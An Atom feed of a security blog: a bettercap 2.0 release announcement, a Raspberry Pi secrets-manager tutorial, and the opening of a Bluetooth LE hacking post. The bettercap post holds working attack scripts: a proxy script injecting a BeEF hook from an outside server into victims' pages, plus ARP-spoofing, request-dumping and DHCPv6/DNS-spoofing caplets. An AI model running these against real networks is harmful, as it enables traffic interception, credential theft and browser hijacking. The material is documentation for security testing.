<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>evilsocket / Simone</title>
  <subtitle>I hack stuff.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.evilsocket.net/"/>
  <updated>2018-02-27T20:53:59.326Z</updated>
  <id>https://www.evilsocket.net/</id>
  
  <author>
    <name>Simone Margaritelli</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>All Hail Bettercap 2.0, One Tool to Rule Them All.</title>
    <link href="https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/"/>
    <id>https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/</id>
    <published>2018-02-27T19:37:20.000Z</published>
    <updated>2018-02-27T20:53:59.326Z</updated>
    
    <content type="html"><![CDATA[<p>It’s with immense pleasure that I announce the <a href="https://github.com/bettercap/bettercap/releases/tag/v2.0.0" target="_blank" rel="external">release of the second generation of bettercap</a>, a complete reimplementation of the most complete and advanced Man-in-the-Middle attack framework. This release not only brings MITM attacks to the next level, but it aims to be the reference framework for network monitoring (we &lt;3 blueteams too), 802.11, BLE attacks and more! :D</p>
<center><br><strong style="font-size:25px"><br>ベッターキャップ！<br></strong><br><img width="200px" src="https://www.bettercap.org/img/logo.png"><br></center>

<a id="more"></a>
<p>The first thing I want to mention is the <a href="https://github.com/orgs/bettercap/people" target="_blank" rel="external">amazing team</a> that helped me debugging during endless sessions on Windows, or implemented new features that changed the tool radically, or tested, or gave ideas, or reported bugs (on GitHub, not on Twitter -.-) … <strong>you guys rock</strong> and I am so lucky, <strong>thank you</strong>.</p>
<p>Let’s get started :D</p>
<h3 id="Performances"><a href="#Performances" class="headerlink" title="Performances"></a>Performances</h3><p>As who’s following either me or <a href="https://twitter.com/bettercap" target="_blank" rel="external">bettercap</a> itself on Twitter probably knows, the biggest change has been in the underlying technology and framework that bettercap relies upon, we switched from a Ruby application, to a compiled Go application and this increased performances tremendously for several reasons. </p>
<p>First, we’re not victims of a <a href="https://en.wikipedia.org/wiki/Global_interpreter_lock" target="_blank" rel="external">GIL</a> anymore, this plus Go’s amazing concurrency mechanisms allowes bettercap 2.0 to run on low end hardware and still keep proxying hundreds of connections per second and forwarding tens of hundres of packets, while the previous version had an average of 5-6 connections/s due to how I/O requests were pooled by the interpreter while locking (aka the GIL sucks, a lot). Long story short, <strong>no more unwanted network DoS when performing a MITM attack</strong>!! F YEAH! <em>- put cool ninja move here -</em></p>
<p>Also memory and CPU usage now are extremely optimized, you can run several instances of bettercap on your Raspberry Pi (or laptop, or router, or whatever … quite literally) and your CPU cores won’t even get to 20% unless you’re attacking a huge subnet … you can monitor LAN events in real time, while scanning for WiFi access points, while attacking BLE devices nearby and all at the same time, super fast, on low end hardware … but more on this later.</p>
<p><strong>TL;DR:</strong> FU Ruby, Go is amazing, fast and scales exceptionally well. </p>
<h3 id="Ease-of-installation-and-Portability"><a href="#Ease-of-installation-and-Portability" class="headerlink" title="Ease of installation and Portability"></a>Ease of installation and Portability</h3><p>Needless to say, having <strong>a single binary with zero dependencies</strong> (or just libpcap.so on some platforms, thing that will be solved with a full static build soon) that you can just drop on a router/server/whatever and run is way better than the whole rubygems/rvm/rubyenv/whateverbs mess, while if you want to update to bleeding edge, all you have to do is install Go and then <code>go get -u github.com/bettercap/bettercap</code> … how freaking cool is that? :D</p>
<p>Oh … and this new version supports <strong>Windows, macOS, Android, Linux (arm, mips, mips64, etc)</strong> and soon iOS ^_^</p>
<h3 id="Old-but-brand-new"><a href="#Old-but-brand-new" class="headerlink" title="Old but brand new."></a>Old but brand new.</h3><p>The useful features of the old version have been ported to this new one and you will find them as <a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="external">session modules</a> (really, RTFM, I spent hours writing that shit), so you’ll have <code>net.recon</code> searching for new hosts on your network while <code>net.probe</code> will keep probing for new ones, there’s our old friend <code>arp.spoof</code> with his buddies <code>tcp.proxy</code>, <code>http.proxy</code> and  <code>https.proxy</code> (now <strong>all proxies are scriptable in Javascript</strong>) with some new <code>dhcp6.spoof</code> friend. You have the <code>net.sniff</code>er of course, a <code>syn.scan</code>ner if you need and several other core modules you can use to script your interactive session while the <code>events.stream</code> will flow in front of you :D</p>
<p>Talking about scripting, as I said proxy modules are easily scriptable in JS:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onLoad</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    log( <span class="string">"BeefInject loaded."</span> );</div><div class="line">    log(<span class="string">"targets: "</span> + env[<span class="string">'arp.spoof.targets'</span>]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onResponse</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>( res.ContentType.indexOf(<span class="string">'text/html'</span>) == <span class="number">0</span> )&#123;</div><div class="line">        <span class="keyword">var</span> body = res.ReadBody();</div><div class="line">        <span class="keyword">if</span>( body.indexOf(<span class="string">'&lt;/head&gt;'</span>) != <span class="number">-1</span> ) &#123;</div><div class="line">            res.Body = body.replace( </div><div class="line">                <span class="string">'&lt;/head&gt;'</span>, </div><div class="line">                <span class="string">'&lt;script type="text/javascript" src="http://beef-server:3000/hook.js"&gt;&lt;/script&gt;&lt;/head&gt;'</span> </div><div class="line">            ); </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Also, now we have “caplets”, which are basically like metasploit <code>.rc</code> files … enough ugly shell scripts because we don’t remember the command line for every attack scenario, now you can save your commands as <code>.cap</code> files and load them from your interactive session, let’s see a couple of interesting examples :D</p>
<p><code>http-req-dump.cap</code></p>
<p>Execute an ARP spoofing attack on the whole network (by default) or on a host (using <code>-eval</code> as described), intercept HTTP and HTTPS requests with the <code>http.proxy</code> and <code>https.proxy</code> modules and dump them using the <code>http-req-dumsp.js</code> proxy script.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># targeting the whole subnet by default, to make it selective:</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#   sudo ./bettercap -caplet caplets/http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"</span></div><div class="line"></div><div class="line"><span class="comment"># to make it less verbose</span></div><div class="line"><span class="comment"># events.stream off</span></div><div class="line"></div><div class="line"><span class="comment"># discover a few hosts </span></div><div class="line">net.probe on</div><div class="line">sleep 1</div><div class="line">net.probe off</div><div class="line"></div><div class="line"><span class="comment"># uncomment to enable sniffing too</span></div><div class="line"><span class="comment"># set net.sniff.verbose false</span></div><div class="line"><span class="comment"># set net.sniff.local true</span></div><div class="line"><span class="comment"># set net.sniff.filter tcp port 443</span></div><div class="line"><span class="comment"># net.sniff on</span></div><div class="line"></div><div class="line"><span class="comment"># we'll use this proxy script to dump requests</span></div><div class="line"><span class="built_in">set</span> https.proxy.script caplets/http-req-dump.js</div><div class="line"><span class="built_in">set</span> http.proxy.script caplets/http-req-dump.js</div><div class="line">clear</div><div class="line"></div><div class="line"><span class="comment"># go ^_^</span></div><div class="line">http.proxy on</div><div class="line">https.proxy on</div><div class="line">arp.spoof on</div></pre></td></tr></table></figure>
<p><code>netmon.cap</code></p>
<p>An example of how to use the <code>ticker</code> module, use this caplet to monitor activities on your network.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># clear the screen and show data every second</span></div><div class="line"><span class="comment"># this will create a nice animation of your</span></div><div class="line"><span class="comment"># network activity</span></div><div class="line"><span class="built_in">set</span> ticker.commands <span class="string">"clear; net.show; events.show 20"</span></div><div class="line">ticker on</div><div class="line"></div><div class="line">net.probe on</div></pre></td></tr></table></figure>
<p><code>airodump.cap</code></p>
<p>Same as <code>netmon.cap</code> but will monitor for WiFi access points and clients instead of network hosts.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># let's add some api :D</span></div><div class="line">include caplets/rest-api.cap</div><div class="line"></div><div class="line"><span class="built_in">set</span> $ &#123;by&#125;&#123;fw&#125;&#123;env.iface.name&#125;&#123;reset&#125; &#123;bold&#125;» &#123;reset&#125;</div><div class="line"><span class="built_in">set</span> ticker.commands clear; wifi.show; net.show; events.show 20</div><div class="line"></div><div class="line"><span class="comment"># uncomment to disable channel hopping</span></div><div class="line"><span class="comment"># set wifi.recon.channel 1</span></div><div class="line"></div><div class="line">wifi.recon on</div><div class="line">ticker on</div><div class="line">events.clear</div><div class="line">clear</div></pre></td></tr></table></figure>
<p><code>mitm6.cap</code></p>
<p><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank" rel="external">Reroute IPv4 DNS requests by using DHCPv6 replies</a>, start a HTTP server and DNS spoofer for <code>microsoft.com</code> and <code>google.com</code> (works against Windows 10 ^_^):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># let's spoof Microsoft and Google ^_^</span></div><div class="line"><span class="built_in">set</span> dns.spoof.domains microsoft.com, google.com</div><div class="line"><span class="built_in">set</span> dhcp6.spoof.domains microsoft.com, google.com</div><div class="line"></div><div class="line"><span class="comment"># every request http request to the spoofed hosts will come to us</span></div><div class="line"><span class="comment"># let's give em some contents</span></div><div class="line"><span class="built_in">set</span> http.server.path caplets/www</div><div class="line"></div><div class="line"><span class="comment"># serve files</span></div><div class="line">http.server on</div><div class="line"><span class="comment"># redirect DNS request by spoofing DHCPv6 packets</span></div><div class="line">dhcp6.spoof on</div><div class="line"><span class="comment"># send spoofed DNS replies ^_^</span></div><div class="line">dns.spoof on</div><div class="line"></div><div class="line"><span class="comment"># set a custom prompt for ipv6</span></div><div class="line"><span class="built_in">set</span> $ &#123;by&#125;&#123;fw&#125;&#123;cidr&#125; &#123;fb&#125;&gt; &#123;env.iface.ipv6&#125; &#123;reset&#125; &#123;bold&#125;» &#123;reset&#125;</div><div class="line"><span class="comment"># clear the events buffer and the screen</span></div><div class="line">events.clear</div><div class="line">clear</div></pre></td></tr></table></figure>
<p>These are just a few basic examples, I strongly encourage you to check the <a href="https://github.com/bettercap/caplets" target="_blank" rel="external">caplets repository</a>.</p>
<h3 id="WiFi-BLE-and-more-to-come"><a href="#WiFi-BLE-and-more-to-come" class="headerlink" title="WiFi, BLE and more to come!"></a>WiFi, BLE and more to come!</h3><p>There’s a brand new <code>wifi.recon</code> module that will either stick to a channel or perform channel hopping, both for 2.4Ghz and 5.0Ghz frequencies, reporting useful information on what’s going on at the <strong>802.11</strong> layer, the <code>wifi.deauth</code> module will deauth clients (doh!) while the <code>net.sniff</code>er will capture WPA2 handshakes (<strong>bye bye kismet, airodump, airmon, wifite</strong>, etc!). Meanwhile, the <code>ble.recon</code> will discover every <strong>Bluetooth Low Energy</strong> device you might want to inspect with <code>ble.enum</code> or fuzz with <code>ble.write</code>. Also <code>wifi.fuzz</code> and <code>ble.fuzz</code> modules are work in progress, as well as <code>sdr.*</code> modules and others.</p>
<p>Did I mention that this works on macOS and Windows too? :D Oh, and probably your macOS has <a href="https://twitter.com/bettercap/status/967453847114407936" target="_blank" rel="external">a WiFi card capable of monitor mode and frames injection already</a> :D This release is taking everything to the next level, we’re not just in the ethernet, <strong>we are everywhere</strong>.</p>
<h3 id="Abemus-API"><a href="#Abemus-API" class="headerlink" title="Abemus API"></a>Abemus API</h3><p>I believe this is functionally the biggest change, or at least the one with the biggest potential: <strong>we finally have a <a href="https://github.com/bettercap/bettercap/wiki/api.rest" target="_blank" rel="external">REST API</a>!</strong> Imagine having a mobile client for your bettercap instance running in your dropbox, or simply imagine to develop a mobile application just by launching the Android executable, using the <code>http.server</code> module itself to serve a web UI and just create a WebView to render it … boom, easy mobile baby! :D</p>
<p>You can read every single bit of information, you can have per IP realtime network statistics, you can send commands, wait for events … the sky is the limit!!! <em>-put evil laugh here-</em></p>
<center><br><blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">There&#39;s power on that USB … kismet on a drone ftw <a href="https://t.co/CbeeyL0QtZ" target="_blank" rel="external">pic.twitter.com/CbeeyL0QtZ</a></p>&mdash; 🦄 (@evilsocket) <a href="https://twitter.com/evilsocket/status/941320272728264705?ref_src=twsrc%5Etfw" target="_blank" rel="external">December 14, 2017</a></blockquote><br><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<p>I’m so looking forward to see what users will create with this API, <strong>no more ugly Python wrappers</strong>, <strong>no more parsing complicated log files</strong>! F YEAH!!!</p>
<p>Well, that’s it … everything &lt; 2.0.0 is deprecated and not supported anymore, developement <a href="https://github.com/bettercap" target="_blank" rel="external">moved here</a> and there’s a <a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="external">pretty decent documentation</a> that’ll help you getting started … as usual, <strong>ejoy</strong> :)</p>
<p><img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;It’s with immense pleasure that I announce the &lt;a href=&quot;https://github.com/bettercap/bettercap/releases/tag/v2.0.0&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;release of the second generation of bettercap&lt;/a&gt;, a complete reimplementation of the most complete and advanced Man-in-the-Middle attack framework. This release not only brings MITM attacks to the next level, but it aims to be the reference framework for network monitoring (we &amp;lt;3 blueteams too), 802.11, BLE attacks and more! :D&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;strong style=&quot;font-size:25px&quot;&gt;&lt;br&gt;ベッターキャップ！&lt;br&gt;&lt;/strong&gt;&lt;br&gt;&lt;img width=&quot;200px&quot; src=&quot;https://www.bettercap.org/img/logo.png&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="2" scheme="https://www.evilsocket.net/tags/2/"/>
    
      <category term="release" scheme="https://www.evilsocket.net/tags/release/"/>
    
      <category term="go" scheme="https://www.evilsocket.net/tags/go/"/>
    
      <category term="golang" scheme="https://www.evilsocket.net/tags/golang/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="network" scheme="https://www.evilsocket.net/tags/network/"/>
    
      <category term="wifi" scheme="https://www.evilsocket.net/tags/wifi/"/>
    
      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
    
  </entry>
  
  <entry>
    <title>DIY Portable Secrets Manager With a Raspberry Pi Zero and ARC</title>
    <link href="https://www.evilsocket.net/2017/12/07/DIY-Portable-Secrets-Manager-with-a-RPI-Zero-and-the-ARC-Project/"/>
    <id>https://www.evilsocket.net/2017/12/07/DIY-Portable-Secrets-Manager-with-a-RPI-Zero-and-the-ARC-Project/</id>
    <published>2017-12-07T16:42:48.000Z</published>
    <updated>2017-12-07T19:41:14.084Z</updated>
    
    <content type="html"><![CDATA[<p>For the last few days I’ve been working on a new project which I developed for very specific needs and reasons:</p>
<ol>
<li>I need to store safely (encrypted) my passwords, sensitive files, notes, etc.</li>
<li>I need to access them from anywhere, with every possible device ( desktop, mobile, terminal ).</li>
<li>I need those objects to be syncronized accros all my devices.</li>
<li>I don’t want to use “the cloud”.</li>
<li>I don’t want to pay for a server.</li>
<li>I don’t want to enable port forwarding and host it myself with DynDNS or alikes.</li>
</ol>
<p>So I wrote <strong>ARC</strong>.</p>
<p><img src="https://i.imgur.com/NvLlafA.png" alt="arcd"></p>
<a id="more"></a>
<p>Of course there are <strong>plenty</strong> of solutions already that mostly involve the use of <code>pass</code>, <code>ssh</code>, <code>git</code> and various synchronizations hacks, but:</p>
<ol>
<li>Either you’ll host that stuff on github ( “the cloud” ), or you’ll need a server.</li>
<li>You will need a terminal to access that data or complex procedures … good luck when you’re in a hurry and only have your phone.</li>
<li>The type of data you can store and access and the interactions you have with it are very limited.</li>
</ol>
<p>The approach I decided to try is different.</p>
<p><img src="https://i.imgur.com/EkxdwVH.jpg" alt="rpiz"></p>
<p>Arc is a manager for your secrets made of <code>arcd</code>, a RESTful API server written in Go which exposes read and write primitives for <strong>encrypted records</strong> on a sqlite database file.</p>
<p><img src="https://i.imgur.com/swC00gX.png" alt="arcd"></p>
<p>And <code>arc</code>, the client application implemented in html5 and javascript, which runs in every html5 enabled browser and  it is served by <code>arcd</code> itself.</p>
<p><img src="https://pbs.twimg.com/media/DQN8W1KWsAEP6bd.jpg:large" alt="multikey"></p>
<p>Records are generated, encrypted and decrypted <strong>client side only</strong> (Arc relies on CryptoJS for its AES encryption and the PRNG) by <code>arc</code>, which offers an intuitive management system equipped with UI widgets including:</p>
<ul>
<li>Simple text inputs.</li>
<li>Simple text areas.</li>
<li>Custom file attachments (<strong>files are encrypted client side</strong> before being uploaded as binary records).</li>
<li>A markdown editor area with preview and full screen mode.</li>
<li>A password field with <strong>password strength estimation</strong> and a <strong>random password generator</strong>. </li>
</ul>
<p>Elements can be created (with optional expiration dates), arranged and edited using <code>arc</code> and are stored on <code>arcd</code> safely.</p>
<ul style="margin:0; padding:0; list-style-type:none;"><br><li style="float: left; margin-right:15px; width:45%;"><br>    <img src="https://i.imgur.com/KCn4RGw.png"><br>    <small>A client side encrypted record set to expire and self delete with a markdown area and a password widget.</small><br></li><br><li style="float: left; margin-right:15px; width:45%;"><br>    <img src="https://i.imgur.com/nxqmRqY.png"><br>    <small>Markdown and various attached files.</small><br></li><br></ul>

<div style="clear:both;"></div>

<p>The idea is to use <em>the Arc</em>&trade; as a single manager for your passwords, encrypted notes, files and <code>-all the secret things here-</code> while hosting <code>arcd</code> yourself on some spare hardware like a Raspberry Pi and accessing <code>arc</code> from every device with a modern browser, so let’s see how to configure it on a Raspberry Pi Zero in order to have a secure and portable setup for your secrets! :D</p>
<h3 id="Hardware-Setup"><a href="#Hardware-Setup" class="headerlink" title="Hardware Setup"></a>Hardware Setup</h3><pre><code>The following instructions are Raspberry Pi Zero specific, but the same procedure should work on any similar hardware ( like another RPi or the USB Armory for instance ), the RPiZ is just what I found to be more convenient and cheap.
</code></pre><p>First of all, format a micro sd card and install Raspbian on it as usual (download iso, verify, dd, mount), next we need to apply a few tweaks in order to enable ethernet connectivity over its USB port.</p>
<p>With the RPi <code>boot</code> partition mounted, edit the <code>/path/to/pi/boot/config.txt</code> and append:</p>
<pre><code>dtoverlay=dwc2
</code></pre><p>Then edit <code>/path/to/pi/boot/cmdline.txt</code> and insert between the <code>rootwait</code> and the <code>quiet</code> parameters:</p>
<pre><code>modules-load=dwc2,g_ether
</code></pre><p>Eventually your <code>cmdline.txt</code> file will look like this:</p>
<pre><code>dwc_otg.lpm_enable=0 console=serial0,115200 console=tty1 root=PARTUUID=abcdefab-01 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait modules-load=dwc2,g_ether 
</code></pre><p>At last, we need to make Raspbian enable SSH on boot so we’ll be able to connect to it if needed, in order to do this just create an <code>/path/to/pi/boot/ssh</code> empty file.</p>
<p>Unmount the micro sd, insert it into the RPiZ and plug it to the computer <strong>using the USB data port</strong> (not the charge one, we don’t need it ;)).</p>
<p>If everything went fine, your computer should now detect a new network interface, in order to connect to it just assign it any static IP address ( on <code>Ubuntu</code> and similar, set the connection type to <code>Link-Local Only</code>), restart the interface and the RPiZ should be reachable:</p>
<pre><code>ping raspberrypi.local
</code></pre><p>Let’s finish the setup of the board, connect to it via SSH:</p>
<pre><code>ssh pi@raspberrypi.local
</code></pre><p>Expand the filesystem as usual, <strong>change the default SSH password</strong>, enable <strong>private key only SSH authentication</strong>, copy your certificate, etc … as for the hardware part, we’re ready :)</p>
<h3 id="Software-Setup"><a href="#Software-Setup" class="headerlink" title="Software Setup"></a>Software Setup</h3><p>The easiest way for now is to build the <code>arcd</code> server directly on a Raspberry Pi in order to produce an <code>ARMv6</code> binary, once you installed Go on the RPi (not necessarily the one you’re going to use as the secrets store) just <a href="https://github.com/evilsocket/arc#usages://github.com/evilsocket/arc#usage" target="_blank" rel="external">follow the instructions on the repository</a> to compile the server.</p>
<p>Once you compiled it, edit the configuration file:</p>
<pre><code>cd /path/to/arc/repo/arcd
cp sample_config.json config.json
vim config.json
</code></pre><p>And change the <code>address</code> field so we’ll be able to connect to the Arc web interface:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"address"</span>: <span class="string">""</span>,</div><div class="line">    <span class="attr">"port"</span>: <span class="number">8080</span>,</div><div class="line">    <span class="attr">"username"</span>: <span class="string">"PUT_YOUR_USERNAME_HERE"</span>,</div><div class="line">    <span class="attr">"password"</span>: <span class="string">"PUT_YOUR_PASSWORD_HERE"</span>,</div><div class="line">    <span class="attr">"database"</span>: <span class="string">"~/arc.db"</span>,</div><div class="line">    <span class="attr">"token_duration"</span>: <span class="number">60</span>,</div><div class="line">    <span class="attr">"scheduler"</span>: &#123;</div><div class="line">        <span class="attr">"enabled"</span>: <span class="literal">true</span>,</div><div class="line">        <span class="attr">"period"</span>: <span class="number">10</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"tls"</span>: &#123;</div><div class="line">        <span class="attr">"enabled"</span>: <span class="literal">false</span>,</div><div class="line">        <span class="attr">"pem"</span>: <span class="string">"/some/file.pem"</span>,</div><div class="line">        <span class="attr">"key"</span>: <span class="string">"/some/file.key"</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Now just copy the <code>arc</code> folder, the new <code>config.json</code> file and the ARM compiled <code>arcd</code> server to the RPiZ:</p>
<pre><code>scp -r arc arcd_arm config.json pi@raspberrypi.local:/home/pi/
</code></pre><p>SSH to the board and make sure that everything works:</p>
<pre><code>ssh pi@raspberrypi.local
mv arcd_arm arcd
./arcd -config config.json -app arc
</code></pre><p>Open the browser and go to <code>http://raspberrypi.local:8080/</code>, you should now be able to login and use ARC whenever you plug your RPi Zero to the USB port :)</p>
<p>( Make sure to start <code>arcd</code> at boot by editing <code>/etc/rc.local</code> or whatever )</p>
<h3 id="Security-considerations"><a href="#Security-considerations" class="headerlink" title="Security considerations"></a>Security considerations</h3><ul>
<li><p>It should be obvious, but physically isolated data on dedicated hardware is safer.</p>
</li>
<li><p>All the data is encrypted client side, which means everything that is stored physically on the RPiZ is encrypted with <code>AES</code>, make sure to use a strong encryption key, the stronger the key, the safer the data will be in case you lose the hardware.</p>
</li>
<li><p>For additional security, you might store the <code>arc.db</code> server database on a LUKS volume which you will need to manually unlock at boot.</p>
</li>
<li><p>You should generate your own self signed certificate and use it in the <code>tls</code> configuration of Arc in order to use https instead of http.</p>
</li>
<li><p><strong>DO NOT</strong> enable any type of connection sharing from your computer to the RPiZ, we <strong>do not want</strong> anything from the outside world to reach our secure storage, ideally you should disable the wireless interface too if using the <code>W</code> model.</p>
</li>
<li><p>Username and password are needed to access the API itself, but they will <strong>not</strong> decrypt the records, that’s why the encryption key is requested as well. You can login with the same API credentials but different encryption keys, you will create records with a new key and will not be able to decrypt other records that have been created with a different AES key.</p>
</li>
<li><p>Elements can be configured with an expiration date, using it is a good way to remember how old a given password is and have some sort of reminder when it’s time to change it (or just encrypted reminders ^_^).</p>
</li>
</ul>
<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>The project is <a href="https://github.com/evilsocket/arc" target="_blank" rel="external">available on my github</a> as usual, there’s still <a href="https://github.com/evilsocket/arc/milestone/1" target="_blank" rel="external">some work left to do</a> before it reaches the first stable release, but I’m close :)</p>
<p>Stay safe, have fun and …</p>
<p align="center"><br>    <img src="https://i.imgur.com/h5cpCeN.png" alt="Encrypt all the things!"><br></p>

<h3 id="One-last-thing-…"><a href="#One-last-thing-…" class="headerlink" title="One last thing …"></a>One last thing …</h3><p>Yes, it works with smartphones and tablets in OTG mode :)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;For the last few days I’ve been working on a new project which I developed for very specific needs and reasons:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I need to store safely (encrypted) my passwords, sensitive files, notes, etc.&lt;/li&gt;
&lt;li&gt;I need to access them from anywhere, with every possible device ( desktop, mobile, terminal ).&lt;/li&gt;
&lt;li&gt;I need those objects to be syncronized accros all my devices.&lt;/li&gt;
&lt;li&gt;I don’t want to use “the cloud”.&lt;/li&gt;
&lt;li&gt;I don’t want to pay for a server.&lt;/li&gt;
&lt;li&gt;I don’t want to enable port forwarding and host it myself with DynDNS or alikes.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So I wrote &lt;strong&gt;ARC&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/NvLlafA.png&quot; alt=&quot;arcd&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="go" scheme="https://www.evilsocket.net/tags/go/"/>
    
      <category term="golang" scheme="https://www.evilsocket.net/tags/golang/"/>
    
      <category term="oss" scheme="https://www.evilsocket.net/tags/oss/"/>
    
      <category term="arc" scheme="https://www.evilsocket.net/tags/arc/"/>
    
      <category term="arcd" scheme="https://www.evilsocket.net/tags/arcd/"/>
    
      <category term="passwords" scheme="https://www.evilsocket.net/tags/passwords/"/>
    
      <category term="secrets" scheme="https://www.evilsocket.net/tags/secrets/"/>
    
      <category term="notes" scheme="https://www.evilsocket.net/tags/notes/"/>
    
      <category term="password manager" scheme="https://www.evilsocket.net/tags/password-manager/"/>
    
      <category term="encryption" scheme="https://www.evilsocket.net/tags/encryption/"/>
    
      <category term="aes" scheme="https://www.evilsocket.net/tags/aes/"/>
    
  </entry>
  
  <entry>
    <title>This Is Not a Post About BLE, Introducing BLEAH</title>
    <link href="https://www.evilsocket.net/2017/09/23/This-is-not-a-post-about-BLE-introducing-BLEAH/"/>
    <id>https://www.evilsocket.net/2017/09/23/This-is-not-a-post-about-BLE-introducing-BLEAH/</id>
    <published>2017-09-23T15:06:56.000Z</published>
    <updated>2017-09-24T10:03:03.816Z</updated>
    
    <content type="html"><![CDATA[<p>This is not a post about BLE, but rather on how to hack it … well, to be honest, BLE devices are usually very easy to hack, so it’s just a quick intro to it, I’ll also take the chance to open source one of the last tools I’ve made and that I kept private so far. I moved the features I thought to be dangerous ( aka: auto fuzzing all the BLE things and bring chaos ) in a private fork which will stay private, however it’s not that complicated to chain <code>bleah</code> with other tools ( cough … radamsa … cough ) and have <strong>lots of fun</strong>.</p>
<p><img src="/images/2017/09/dr_evil.jpg" alt="dr.evil"></p>
<p>Oh and this is also because <a href="https://twitter.com/Viss" target="_blank" rel="external">someone</a> asked me some intro on BLE, so yeah, his fault.</p>
<a id="more"></a>
<p>For some more detailed (and serious) information, there’s <a href="https://en.wikipedia.org/wiki/Bluetooth_Low_Energy" target="_blank" rel="external">a lot of stuff</a> online already, you know how to Google.</p>
<h3 id="Bluetooth-Low-Energy-the-honest-version"><a href="#Bluetooth-Low-Energy-the-honest-version" class="headerlink" title="Bluetooth Low Energy - the honest version."></a>Bluetooth Low Energy - the honest version.</h3><p>BLE is a cheap and very insecure version of Bluetooth, in which you have no channel hopping (all hail easy sniffing and MITM!) and no builtin protocol security (fuzzing like there’s no tomorrow dudez!), it is mostly used for two reasons:</p>
<ul>
<li>Decent batteries are expensive.</li>
<li>Decent batteries are big.</li>
</ul>
<p>If you wanna build and sell some IoT-smart-whatever crap, and you wanna do it quickly because your competitor is about to go on the market with the same shit, you take Bluetooth, you strip it from the very few close-to-decent things it has and voilà, you have its retarded little brother which won’t bother the battery too much but will be functional enough to burp random data at you from time to time … easy win, litte R&amp;D efforts, very small production costs.</p>
<p>&lt;/rant&gt;</p>
<p>Being the retarded little brother of BT, it doesn’t really take too long to explain how to hack it.</p>
